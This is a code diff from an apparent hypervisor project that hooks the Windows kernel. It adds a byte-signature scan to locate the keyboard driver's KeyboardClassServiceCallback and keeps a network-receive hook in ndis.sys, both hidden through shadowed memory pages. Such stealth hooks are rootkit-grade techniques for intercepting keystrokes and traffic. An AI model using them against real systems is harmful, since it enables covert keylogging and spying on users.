@@ -110,9 +110,21 @@ __attribute__((section(".vmm"))) uint64_t locate_MiDriverLoadSucceeded(uint64_t 
         0x25, 0xff, 0x0f, 0xf8, 0xff    // and eax, 0FFF80FFFh
     };
 
-    uint64_t MiDriverLoadSucceded = find_signature(ntoskrnl, sign, 15) - 0x58;
+    uint64_t MiDriverLoadSucceded = find_signature(ntoskrnl, sign, 15) - 0x49;
 
     return MiDriverLoadSucceded;
+}
+
+__attribute__((section(".vmm"))) uint64_t locate_KeyboardClassServiceCallback(uint64_t kbdclass){
+    byte_t sign[] = {
+        0x48, 0x8b, 0x49, 0x40,     // mov rcx, qword ptr [rcx+40h]
+        0x44, 0x8d, 0x4e, 0x32,     // lea r9d, [rsi+32h]
+        0x44, 0x8d, 0x46, 0x03      // lea r8d,[rsi+3]
+    };
+
+    uint64_t KeyboardClassServiceCallback = find_signature(kbdclass, sign, 12) - 0x3b;
+
+    return KeyboardClassServiceCallback;
 }
 
 __attribute__((section(".vmm"))) void handle_lstar_write(uint64_t lstar){
@@ -144,7 +156,6 @@ __attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_d
     if (shared_cores_data.ndis == 0){
         shared_cores_data.ndis = find_windows_module(u"ndis.sys", 16);
         if (shared_cores_data.ndis != 0){
-            // hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
             hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET),
              &shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_x,
               shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_rw);
@@ -158,6 +169,7 @@ __attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_d
     if (get_node_dllname_length(head) == sizeof(u"kbdclass.sys")-2 && memcmp(get_node_dllname_buffer(head), u"kbdclass.sys", sizeof(u"kbdclass.sys")-2)){
         shared_cores_data.kbdclass = get_node_dllbase(head);
         LOG_INFO("Found kbdclass.sys: %x\n", shared_cores_data.kbdclass);
+        shared_cores_data.functions.KeyboardClassServiceCallback = locate_KeyboardClassServiceCallback(shared_cores_data.kbdclass);
     }
 
     // Remove the MiDriverLoadSucceeded hook if all drivers were found
